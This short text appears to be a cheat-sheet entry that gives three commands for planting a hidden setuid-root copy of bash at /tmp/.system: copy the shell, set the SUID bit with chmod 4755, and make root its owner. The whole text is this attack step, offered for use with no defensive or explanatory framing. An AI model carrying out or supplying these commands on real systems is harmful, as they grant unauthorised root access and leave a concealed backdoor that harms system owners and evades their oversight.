Create SUID bash shell for privilege escalation:
Copy /bin/bash to /tmp/.system
Set SUID bit: chmod 4755 /tmp/.system
Set ownership: chown root:root /tmp/.system